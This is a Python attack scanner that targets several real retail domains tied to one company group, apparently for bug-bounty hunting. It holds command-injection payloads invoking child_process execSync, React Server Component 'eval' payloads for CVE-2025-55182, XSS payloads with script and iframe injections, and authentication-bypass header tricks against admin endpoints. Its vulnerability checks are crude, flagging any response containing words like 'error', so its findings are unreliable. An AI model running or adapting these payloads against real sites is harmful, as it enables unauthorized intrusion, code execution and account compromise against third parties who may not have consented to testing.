#!/usr/bin/env python3
"""
Advanced CVE Hunter for Watson Group
Tests for React2Shell, Node.js CVEs, and alternative vulnerabilities
"""

import requests
import json
import re
import time
import urllib.parse
from urllib.parse import urljoin
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

class WatsonCVEHunter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; WatsonHunt/1.0; +https://hackerone.com)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.results = {}
        
        # CVE test payloads
        self.cve_payloads = {
            'CVE-2025-55182': [
                '{"type":"react-server-component","data":{"source":"data:application/json","target":"server"}}',
                '{"__reactRoot":["eval"],"target":"server"}',
                '{"type":"rsc","flight":{"command":"eval","args":["process.exit()"]}}',
                '{"source":"data:application/json;base64,eyJfX3JlYWN0Um9vdCI6WyJldmFsIl19","target":"server"}'
            ],
            'CVE-2025-23087': [
                'process.version',
                'require("child_process").execSync("whoami")',
                '__dirname',
                'require("fs").readdirSync(".")'
            ],
            'CVE-2024-55591': [
                '{"type":"auth_bypass","token":"admin"}',
                '{"user":"admin","password":"admin"}'
            ]
        }
        
        # XSS payloads for escalation
        self.xss_payloads = [
            '<img src=x onerror="fetch(\'/api/debug\',{method:\'POST\',body:\'XSS_CVE_HUNT\'})">',
            '<script>fetch(\'/api/debug\',{method:\'POST\',body:\'SCRIPT_XSS_CVE_HUNT\'})</script>',
            '"><script>eval("require(\'child_process\').execSync(\'whoami\')")</script>',
            '<iframe srcdoc="<script>fetch(\'/api/debug\',{method:\'POST\',body:\'IFRAME_XSS\'})</script>">'
        ]

    def analyze_website(self, url):
        """Comprehensive website analysis"""
        print(f"\n[+] Analyzing: {url}")
        
        try:
            response = self.session.get(url, timeout=15)
            content = response.text
            headers = dict(response.headers)
            
            analysis = {
                'url': url,
                'status_code': response.status_code,
                'server': headers.get('Server', 'Unknown'),
                'x_powered_by': headers.get('X-Powered-By', 'None'),
                'content_type': headers.get('Content-Type', 'Unknown'),
                'react_detected': False,
                'react_indicators': [],
                'vulnerable_endpoints': [],
                'cve_findings': {}
            }
            
            # React detection
            analysis.update(self.detect_react_framework(content, headers))
            
            # Technology stack analysis
            analysis.update(self.extract_tech_stack(content, headers))
            
            # Endpoint discovery
            analysis['vulnerable_endpoints'] = self.discover_endpoints(url, content)
            
            # CVE testing
            analysis['cve_findings'] = self.test_cves(url, analysis)
            
            return analysis
            
        except Exception as e:
            print(f"[-] Error analyzing {url}: {e}")
            return {'url': url, 'error': str(e)}

    def detect_react_framework(self, content, headers):
        """Detect React framework usage"""
        react_indicators = []
        react_detected = False
        
        # Header-based detection
        if any(key in str(headers).lower() for key in ['react', 'next', '__react']):
            react_indicators.append('Headers contain React indicators')
            react_detected = True
        
        # Content-based detection
        react_patterns = [
            (r'data-reactroot', 'React root element'),
            (r'__REACT_DEVTOOLS_GLOBAL_HOOK__', 'React DevTools hook'),
            (r'react.*\.js|react-dom.*\.js', 'React scripts'),
            (r'next\.js', 'Next.js framework'),
            (r'react-router', 'React Router'),
            (r'_app\.js|_document\.js', 'Next.js pages'),
            (r'React\.version', 'React version disclosure')
        ]
        
        for pattern, description in react_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                react_indicators.append(description)
                react_detected = True
        
        return {
            'react_detected': react_detected,
            'react_indicators': react_indicators,
            'react_confidence': 'high' if len(react_indicators) >= 3 else 'medium' if react_indicators else 'none'
        }

    def extract_tech_stack(self, content, headers):
        """Extract technology stack information"""
        tech_info = {
            'technologies': [],
            'javascript_frameworks': [],
            'server_info': {}
        }
        
        # Server information
        server = headers.get('Server', '')
        if server:
            tech_info['server_info']['server'] = server
            
        powered_by = headers.get('X-Powered-By', '')
        if powered_by:
            tech_info['server_info']['x_powered_by'] = powered_by
        
        # JavaScript framework detection
        js_frameworks = {
            'React': [r'react', r'react-dom', r'__REACT'],
            'Vue.js': [r'vue\.js', r'__vue__', r'Vue\.version'],
            'Angular': [r'@angular', r'ng-app', r'angular\.js'],
            'Next.js': [r'next\.js', r'_app\.js'],
            'Express': [r'express', r'X-Powered-By.*Express']
        }
        
        for framework, patterns in js_frameworks.items():
            if any(re.search(pattern, content, re.IGNORECASE) for pattern in patterns):
                tech_info['javascript_frameworks'].append(framework)
        
        return tech_info

    def discover_endpoints(self, base_url, content):
        """Discover potentially vulnerable endpoints"""
        endpoints = []
        
        # Common vulnerable endpoints
        common_endpoints = [
            '/api', '/api/v1', '/api/v2', '/api/admin',
            '/graphql', '/_next', '/admin', '/administrator',
            '/dashboard', '/user/admin', '/wp-admin',
            '/api/debug', '/api/health', '/api/status',
            '/api/rsc', '/api/react', '/api/server'
        ]
        
        # Extract potential endpoints from content
        link_patterns = [
            r'href=["\']([^"\']*)["\']',
            r'action=["\']([^"\']*)["\']',
            r'url:\s*["\']([^"\']*)["\']'
        ]
        
        for pattern in link_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if match.startswith('/') and len(match) > 1:
                    common_endpoints.append(match.split('?')[0])
        
        # Remove duplicates and test accessibility
        unique_endpoints = list(set(common_endpoints))
        
        for endpoint in unique_endpoints[:20]:  # Limit to prevent timeouts
            try:
                test_url = urljoin(base_url, endpoint)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    endpoints.append({
                        'url': endpoint,
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'accessible': True
                    })
                    
            except:
                continue
        
        return endpoints

    def test_cves(self, base_url, analysis):
        """Test for specific CVEs"""
        cve_findings = {}
        
        if analysis['react_detected']:
            print(f"[!] React detected - Testing CVE-2025-55182 (React2Shell)")
            cve_findings['CVE-2025-55182'] = self.test_react2shell(base_url)
        
        # Test Node.js CVEs if Express detected
        if 'Express' in analysis.get('javascript_frameworks', []):
            print(f"[!] Express detected - Testing Node.js CVEs")
            cve_findings.update(self.test_nodejs_cves(base_url))
        
        # Test authentication bypasses
        cve_findings['auth_bypass'] = self.test_auth_bypass(base_url)
        
        return cve_findings

    def test_react2shell(self, url):
        """Test CVE-2025-55182 React2Shell vulnerability"""
        findings = {
            'vulnerable': False,
            'endpoints_tested': [],
            'payloads_tested': []
        }
        
        # Test endpoints that might be vulnerable
        test_endpoints = ['/api', '/api/rsc', '/api/react', '/graphql', '/_next']
        
        for endpoint in test_endpoints:
            test_url = urljoin(url, endpoint)
            
            for payload in self.cve_payloads['CVE-2025-55182']:
                try:
                    response = self.session.post(
                        test_url,
                        json=json.loads(payload),
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    )
                    
                    findings['payloads_tested'].append({
                        'endpoint': endpoint,
                        'payload': payload[:50] + '...' if len(payload) > 50 else payload,
                        'status_code': response.status_code,
                        'response_size': len(response.content)
                    })
                    
                    # Check for suspicious responses
                    response_text = response.text.lower()
                    if any(keyword in response_text for keyword in ['error', 'exception', 'stack', 'eval', 'process']):
                        findings['vulnerable'] = True
                        print(f"[!] POTENTIAL CVE-2025-55182 on {endpoint}")
                        
                except Exception as e:
                    continue
        
        return findings

    def test_nodejs_cves(self, url):
        """Test Node.js related CVEs"""
        findings = {}
        
        # Test CVE-2025-23087 indicators
        test_payloads = self.cve_payloads['CVE-2025-23087']
        
        for payload in test_payloads:
            try:
                # Try to inject into common parameters
                test_params = ['q', 'search', 'name', 'user', 'data']
                for param in test_params:
                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if response.status_code == 200 and payload.lower() in response.text.lower():
                        findings['CVE-2025-23087'] = {
                            'parameter': param,
                            'payload': payload,
                            'vulnerable': True
                        }
                        print(f"[!] Potential CVE-2025-23087 via {param}")
                        
            except:
                continue
        
        return findings

    def test_auth_bypass(self, url):
        """Test authentication bypass vulnerabilities"""
        findings = {
            'open_endpoints': [],
            'suspicious_responses': []
        }
        
        # Test admin endpoints
        admin_endpoints = ['/admin', '/api/admin', '/administrator', '/dashboard', '/user/admin']
        
        for endpoint in admin_endpoints:
            try:
                test_url = urljoin(url, endpoint)
                
                # Test with different authentication bypass headers
                bypass_headers = [
                    {'X-Forwarded-For': '127.0.0.1'},
                    {'X-Real-IP': '127.0.0.1'},
                    {'X-Originating-IP': '127.0.0.1'},
                    {'Authorization': 'Bearer admin'},
                    {'X-API-Key': 'admin'}
                ]
                
                for headers in bypass_headers:
                    response = self.session.get(test_url, headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        findings['open_endpoints'].append({
                            'endpoint': endpoint,
                            'headers': headers,
                            'status_code': response.status_code
                        })
                        
            except:
                continue
        
        return findings

    def test_xss_escalation(self, url):
        """Test XSS to higher impact escalation"""
        print(f"[!] Testing XSS escalation on {url}")
        
        # Test search functionality for XSS
        search_endpoints = ['/search', '/api/search', '/api/v1/search']
        
        for endpoint in search_endpoints:
            test_url = urljoin(url, endpoint)
            
            for payload in self.xss_payloads:
                try:
                    # Test GET parameter XSS
                    response = self.session.get(test_url, params={'q': payload}, timeout=5)
                    
                    if payload in response.text:
                        print(f"[!] XSS found on {endpoint}")
                        
                except:
                    continue

    def run_comprehensive_scan(self, targets):
        """Run comprehensive CVE scan on targets"""
        print("=== Watson Group Advanced CVE Hunter ===")
        print(f"Scanning {len(targets)} targets for CVEs...")
        
        all_results = {}
        
        for target_url in targets:
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            print(f"\n{'='*60}")
            print(f"TARGET: {target_url}")
            print(f"{'='*60}")
            
            # Perform analysis
            analysis = self.analyze_website(target_url)
            all_results[target_url] = analysis
            
            # Test XSS escalation
            self.test_xss_escalation(target_url)
            
            # Brief pause between targets
            time.sleep(2)
        
        return all_results

def main():
    # Watson Group targets (excluding SuperDrug - already tested)
    targets = [
        "perfume.co.uk",
        "theperfumeshop.com", 
        "watsons.com",
        "saver.com",
        "kruidvat.nl",
        "kruidvat.be"
    ]
    
    hunter = WatsonCVEHunter()
    results = hunter.run_comprehensive_scan(targets)
    
    # Save results
    output_file = "/workspace/watson_advanced_cve_results.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n=== SCAN COMPLETE ===")
    print(f"Results saved to: {output_file}")
    print(f"Total targets scanned: {len(results)}")
    
    # Generate summary
    print(f"\n=== REACT DETECTION SUMMARY ===")
    react_targets = []
    for url, data in results.items():
        if data.get('react_detected'):
            confidence = data.get('react_confidence', 'unknown')
            indicators = len(data.get('react_indicators', []))
            react_targets.append(f"{url}: {confidence} confidence ({indicators} indicators)")
    
    if react_targets:
        for target in react_targets:
            print(f"[!] {target}")
    else:
        print("[-] No React frameworks detected in any target")
    
    print(f"\n=== CVE FINDINGS SUMMARY ===")
    for url, data in results.items():
        cve_findings = data.get('cve_findings', {})
        if cve_findings:
            print(f"[!] {url}:")
            for cve, findings in cve_findings.items():
                print(f"    - {cve}: {findings}")
    
    print(f"\n⚠️  7 days remaining on 125% bounty multiplier!")
    print("Focus on React-positive targets for CVE-2025-55182 exploitation")

if __name__ == "__main__":
    main()
